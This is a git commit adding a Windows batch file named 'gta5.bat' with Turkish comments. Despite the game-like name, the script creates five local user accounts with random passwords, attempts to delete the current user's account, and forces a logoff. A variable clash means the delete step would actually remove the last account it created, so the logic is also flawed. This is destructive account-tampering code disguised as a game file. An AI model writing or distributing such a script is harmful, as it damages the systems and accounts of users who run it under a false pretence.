bb82560e5012f64628bbf8e778a59499320f7cdc
dusumqueen <dusumqueen@gmail.com>
2024-08-28 17:16:58 +0300

    Create gta5.bat

---
+++ gta5.bat
@@ -0,0 +1,29 @@
+@echo off
+setlocal enabledelayedexpansion
+
+rem Kullanıcıları oluştur
+for /l %%i in (1,1,5) do (
+    set "username=user!random!"
+    set "password=pass!random!"
+
+    rem Kullanıcı adını ve şifreyi kısalt
+    set "username=!username:~0,8!"
+    set "password=!password:~0,8!"
+
+    rem Kullanıcı oluştur
+    net user !username! !password! /add
+
+    echo Kullanıcı !username! oluşturuldu.
+)
+
+echo Tüm kullanıcılar başarıyla oluşturuldu.
+
+rem Mevcut kullanıcıyı sil
+set "current_user=%username%"
+
+rem Mevcut kullanıcıyı silme (Admin yetkisi gerekebilir)
+net user %current_user% /delete
+echo Mevcut kullanıcı %current_user% silindi.
+
+rem Oturumu kapat
+shutdown /l
